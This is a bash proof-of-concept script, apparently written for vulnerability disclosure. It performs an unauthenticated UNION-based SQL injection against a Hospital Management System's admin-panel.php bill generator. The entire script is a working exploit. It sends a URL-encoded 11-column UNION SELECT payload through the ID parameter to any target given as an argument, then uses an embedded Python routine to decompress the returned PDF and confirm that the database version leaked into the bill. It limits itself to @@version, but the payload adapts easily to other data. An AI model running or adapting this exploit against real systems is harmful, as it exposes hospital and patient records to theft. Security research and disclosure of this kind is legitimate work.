#!/usr/bin/env bash
# Hospital-Management-System Bill PDF UNION SQL Injection - PoC
# Package: hms-union-exfiltration (HMS-02, admin-panel.php:86)
# Target: GET /admin-panel.php?ID=<inj>&generate_bill=1 (no Cookie header)
# Usage: ./poc.sh http://<target-host>[:port]
# Harmless extraction target only (@@version). No credential extraction in this PoC.

BASE="${1:-http://localhost:8000}"
OUTDIR=$(mktemp -d)

echo "[*] Baseline bill PDF (ID=1)"
curl -s -o "$OUTDIR/baseline.pdf" -w '    status=%{http_code} bytes=%{size_download}\n' \
  "$BASE/admin-panel.php?ID=1&generate_bill=1"
# expect: HTTP 200, ~7022 bytes on the seeded DB

echo "[*] UNION injection, 11 columns, harmless target @@version"
curl -s -o "$OUTDIR/payload.pdf" -w '    status=%{http_code} bytes=%{size_download}\n' \
  "$BASE/admin-panel.php?ID=9999%27%20UNION%20SELECT%201%2C@@version%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20FROM%20patreg--%20-&generate_bill=1"
# expect: HTTP 200, larger PDF (~11844 bytes on the seeded DB)

echo "[*] Proof: decompress FlateDecode streams and diff"
python - "$OUTDIR/baseline.pdf" "$OUTDIR/payload.pdf" <<'PY'
import re, sys, zlib
def streams(p):
    data = open(p, 'rb').read()
    out = []
    for m in re.finditer(rb'stream\r?\n(.*?)endstream', data, re.S):
        try: out.append(zlib.decompress(m.group(1)))
        except Exception: pass
    return b'\n'.join(out)
base, pay = streams(sys.argv[1]), streams(sys.argv[2])
for token in (b'11.', b'Ubuntu', b'8.0'):
    print(f'    {token!r:12} baseline={token in base} payload={token in pay}')
print('    (version digits appear in the payload PDF only -> UNION row rendered into bill)')
PY

echo "[*] Artifacts: $OUTDIR/baseline.pdf , $OUTDIR/payload.pdf"
